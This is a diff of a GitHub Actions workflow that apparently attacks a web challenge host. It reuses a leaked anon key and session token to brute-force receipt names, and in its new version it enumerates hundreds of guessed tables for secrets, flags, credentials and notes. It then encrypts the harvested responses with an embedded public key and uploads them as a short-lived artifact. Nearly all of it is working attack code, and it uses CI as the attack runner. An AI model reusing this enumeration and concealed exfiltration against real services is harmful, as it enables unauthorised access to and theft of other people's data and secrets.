@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe receipt names derived from leaked preview receipt
+      - name: Discover note/secret/metadata tables and encrypt hits
         shell: bash
         run: |
           set -euo pipefail
@@ -30,34 +30,30 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json,itertools,re,concurrent.futures
+          import requests,pathlib,urllib.parse,json,itertools,concurrent.futures
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json()
-          url=urllib.parse.urljoin(base,mf['receiptRedeemEndpoint']); project=boot['project']
-          h={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session'],'X-Launchlet-Preview':project,'User-Agent':'Mozilla/5.0'}
-          known=mf['previewReceipt']; parts=known.split('_'); suffix='2026'
-          modes=['preview','deploy','deployment','release','prod','production','enterprise','internal','publish','published','final','finalreview','final_review','rollout','staging','rc3','inspector','export','artifact']
-          subjects=['demo','demo_board','board','release_pulse','releasepulse','launchlet','enterprise','prod','production','deploy','release','preview','8b11c','preview_8b11c']
-          recs={known}
-          for m in modes:
-            recs.add(f'lrec_{m}_demo_{suffix}'); recs.add(f'lrec_{m}_demo_board_{suffix}'); recs.add(f'lrec_demo_{m}_{suffix}'); recs.add(f'lrec_demo_board_{m}_{suffix}'); recs.add(f'lrec_{m}_{suffix}')
-          for m,sub in itertools.product(modes,subjects):
-            recs.add(f'lrec_{m}_{sub}_{suffix}'); recs.add(f'lrec_{sub}_{m}_{suffix}')
-          recs.update(['lrec_preview_8b11c','lrec_8b11c','lrec_preview-8b11c','lrec_deploy_8b11c','lrec_release_8b11c','preview-8b11c'])
-          projects=[project,'launchlet-demo','demo','release-pulse','launchlet-release-pulse','launchlet-enterprise','enterprise', 'preview-8b11c']
-          def probe(pair):
-            rec,proj=pair
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); root=boot['api']['dataApiBase'].rstrip('/')+'/'
+          auth={'Accept':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session'],'User-Agent':'Mozilla/5.0'}
+          stems=['workspace','project','build','preview','deploy','deployment','release','production','prod','enterprise','internal','admin','operator','review','final_review','final','rollout','publish','artifact','action','server_action','server_reference','runtime','environment','secret','flag','config','policy','approval','inspection','inspector','receipt','capability','context','session','target','queue','job','audit']
+          suffixes=['notes','note','secrets','secret','metadata','meta','refs','references','config','configs','settings','tokens','token','flags','flag','records','record','state','status','details','info','data','logs','log','audit','audits','reviews','review','approvals','approval','artifacts','artifact','keys','key','credentials','credential','exports','export']
+          tables={'workspace_notes','release_notes','deploy_notes','deployment_notes','internal_notes','review_notes','final_review_notes','enterprise_notes','production_notes','admin_notes','secret_notes','secrets','flags','config','metadata'}
+          for a,b in itertools.product(stems,suffixes): tables.add(a+'_'+b)
+          tables=sorted(tables)
+          def one(pair):
+            table,use_preview=pair
+            h=dict(auth)
+            if use_preview:h['X-Launchlet-Preview']=boot['project']
             try:
-              r=requests.post(url,headers=h,json={'receipt':rec,'project':proj},timeout=7,allow_redirects=False)
-              txt=r.text.strip()
-              if txt!='{"error":"receipt_not_found"}': return {'receipt':rec,'project':proj,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+              r=requests.get(urllib.parse.urljoin(base,root+table+'?select=*'),headers=h,timeout=7,allow_redirects=False)
+              if r.status_code!=404:
+                return {'table':table,'preview_header':use_preview,'status':r.status_code,'body':r.text[:50000],'headers':dict(r.headers)}
             except Exception: pass
           hits=[]
           with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
-            for x in ex.map(probe,itertools.product(sorted(recs),projects)):
-              if x: hits.append(x)
-          (out/'summary.json').write_text(json.dumps({'candidate_count':len(recs),'hits':hits},indent=2))
+            for x in ex.map(one,itertools.product(tables,[False,True])):
+              if x:hits.append(x)
+          (out/'summary.json').write_text(json.dumps({'count':len(tables),'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -73,6 +69,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-receipt-family-encrypted
+          name: launchlet-part2-service-tables-encrypted
           path: artifact/
           retention-days: 1
